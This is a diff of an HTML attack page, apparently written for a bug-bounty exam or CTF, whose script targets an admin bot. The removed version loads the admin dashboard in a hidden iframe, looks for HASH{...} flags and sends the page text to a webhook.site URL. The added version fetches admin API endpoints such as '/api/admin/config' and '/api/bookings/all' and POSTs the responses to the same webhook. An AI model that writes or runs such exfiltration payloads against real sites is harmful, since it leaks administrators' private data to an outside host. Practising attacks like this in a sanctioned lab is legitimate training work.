@@ -2,43 +2,37 @@
 <html>
 <body>
     <script>
-        // Notify webhook that the bot is on GitHub
-        fetch('https://webhook.site/56b0b051-9161-4764-a305-ef35995f1de4/SCRAPER_ACTIVE');
+        async function huntFlags() {
+            const webhook = 'https://webhook.site/56b0b051-9161-4764-a305-ef35995f1de4';
+            
+            // 1. List of API endpoints that usually hold the "Big" flags
+            const endpoints = [
+                '/api/admin/system/info',
+                '/api/admin/stats',
+                '/api/bookings/all',
+                '/api/admin/config'
+            ];
 
-        async function startScrape() {
-            // 1. Open the Admin Dashboard in a hidden iframe
-            // This allows us to stay on GitHub while "viewing" the admin page
-            const iframe = document.createElement('iframe');
-            iframe.src = 'https://bugbounty-exam.hashacademy.co/admin/dashboard';
-            iframe.style.display = 'none';
-            document.body.appendChild(iframe);
-
-            // 2. Wait for the Next.js hydration (6 seconds is safer)
-            await new Promise(r => setTimeout(r, 6000));
-
-            try {
-                // 3. Try to grab the text from the admin's own body
-                // Since the bot is on the same origin (the iframe), we grab it
-                const content = document.body.innerText + document.documentElement.innerHTML;
-                
-                // 4. Send the ENTIRE text to your webhook
-                // We search for the pattern HASH{...} directly in the script
-                const flagMatch = content.match(/HASH\{.*?\}/);
-                const exfilData = flagMatch ? flagMatch[0] : "FULL_BODY:" + btoa(content.slice(0, 5000));
-
-                fetch('https://webhook.site/56b0b051-9161-4764-a305-ef35995f1de4', {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    body: exfilData
-                });
-
-            } catch (e) {
-                // 5. Fallback: Force the bot's main window to the flag
-                window.location.href = "https://bugbounty-exam.hashacademy.co/admin/dashboard";
+            for (let url of endpoints) {
+                try {
+                    const r = await fetch('https://api-bugbounty-exam.hashacademy.co' + url);
+                    const data = await r.json();
+                    
+                    // Send any JSON we find to the webhook
+                    fetch(webhook + '/API_LEAK', {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        body: JSON.stringify({path: url, content: data})
+                    });
+                } catch(e) {}
             }
+
+            // 2. Final check: Look for that "internalNotes" field you found before
+            // but in the admin's global view
+            window.location.href = "https://bugbounty-exam.hashacademy.co/admin/messages";
         }
 
-        startScrape();
+        huntFlags();
     </script>
 </body>
 </html>
